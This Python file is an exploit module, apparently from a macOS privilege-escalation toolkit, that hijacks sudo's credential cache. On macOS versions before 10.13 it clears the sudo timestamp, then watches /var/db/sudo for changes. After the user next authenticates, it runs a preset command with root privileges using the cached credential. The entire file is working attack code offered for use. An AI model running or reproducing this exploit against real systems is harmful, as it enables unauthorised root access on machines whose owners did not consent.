"""piggybacks off a sudo command"""
import os
import subprocess
import time
from distutils.version import LooseVersion

from .general import DEFAULT_COMMAND

__cve__ = ""
__credits__ = "n00py"


def vulnerable(version):
    """checks vulnerability"""
    if version < LooseVersion("10.13.0"):
        return "y" == input("[USER INTERACTION] Do you want to piggyback off sudo (waits until sudo is used)? (y/N): ")[0].lower()
    return

def run():
    """runs exploit"""
    sudo_dir = "/var/db/sudo"
    subprocess.call(['sudo -K'], shell=True)
    old_time = time.ctime(os.path.getmtime(sudo_dir))
    exit_loop = False
    while exit_loop is False:
        new_time = time.ctime(os.path.getmtime(sudo_dir))
        if old_time != new_time:
            try:
                subprocess.call(
                    [DEFAULT_COMMAND], shell=True)
                exit_loop = True
            except (OSError, subprocess.CalledProcessError):
                pass
    return exit_loop
